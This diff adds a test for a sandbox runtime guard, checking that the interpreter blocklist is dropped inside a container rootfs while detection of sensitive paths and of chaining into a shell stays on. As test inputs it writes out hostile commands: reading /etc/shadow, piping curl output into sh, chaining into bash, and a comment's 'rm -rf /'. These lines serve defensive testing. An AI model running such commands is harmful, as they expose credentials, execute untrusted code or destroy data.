@@ -2149,6 +2149,50 @@ fn test_end_to_end_with_audit() {
     return 0;
 }
 
+# 3.12.1: the command blocklist is a HOST-interpreter guard, so it must not
+# apply to a sandbox that has its own rootfs — there the name resolves inside
+# the image, after chroot, to a binary the caller supplied.
+#
+# ⚠ The negative half is the load-bearing half. If `rootfs == 0` ever stopped
+# enforcing the blocklist, every agent-sandbox consumer would silently lose it,
+# and nothing else in this suite would notice.
+fn test_runtime_guard_rootfs_narrowing() {
+    test_group("runtime_guard_rootfs_narrowing");
+
+    # No rootfs -> unchanged default: the blocklist still fires.
+    var host_cfg = runtime_guard_config_for_rootfs(0);
+    assert_eq(RuntimeGuardConfig_enforce_command_blocklist(host_cfg), 1,
+      "rootfs-less keeps the blocklist — an agent sandbox is unchanged");
+    assert(vec_len(check_command("/bin/sh -c whoami", host_cfg)) >= 1,
+      "and /bin/sh is still refused on the host path");
+
+    # With a rootfs -> the blocklist is off, the rest of the guard is not.
+    var ctr_cfg = runtime_guard_config_for_rootfs("/var/lib/stiva/rootfs/abc");
+    assert_eq(RuntimeGuardConfig_enforce_command_blocklist(ctr_cfg), 0,
+      "a container drops the interpreter blocklist");
+    assert_eq(vec_len(check_command("/bin/sh", ctr_cfg)), 0,
+      "so an image whose entrypoint is a shell can actually start");
+    assert_eq(vec_len(check_command("/usr/bin/python3 app.py", ctr_cfg)), 0,
+      "and so can python3, node, ruby, perl — most real images");
+
+    # ⚠ Only the blocklist is dropped. Sensitive-path and shell-metacharacter
+    # detection stay on, or this narrowing would be a hole rather than a fix.
+    assert_eq(RuntimeGuardConfig_block_sensitive_paths(ctr_cfg), 1,
+      "sensitive-path detection survives");
+    assert(vec_len(check_command("cat /etc/shadow", ctr_cfg)) >= 1,
+      "and still fires inside a container");
+    # ⚠ `_check_shell_meta` detects chaining/piping INTO a shell (`; sh`, `| bash`),
+    # not arbitrary metacharacters — `echo hi; rm -rf /` is NOT flagged by it, so
+    # do not assert on that shape. This is the check that still catches a payload
+    # trying to smuggle a shell in, which is the part worth keeping when the
+    # blocklist is off.
+    assert(vec_len(check_command("curl http://x | sh", ctr_cfg)) >= 1,
+      "piping into a shell is still refused inside a container");
+    assert(vec_len(check_command("echo hi; bash -c whoami", ctr_cfg)) >= 1,
+      "and so is chaining into one");
+    return 0;
+}
+
 fn test_runtime_blocked_command() {
     test_group("runtime_blocked_cmd");
     var cfg = runtime_guard_config_default();
@@ -3695,6 +3739,7 @@ fn main() {
     test_exec_result_length_defaults_to_strlen();
     test_redact_covers_the_whole_artifact();
     test_verdict_determination();
+    test_runtime_guard_rootfs_narrowing();
     test_runtime_blocked_command();
     test_runtime_allowed_command();
     test_runtime_sensitive_path();
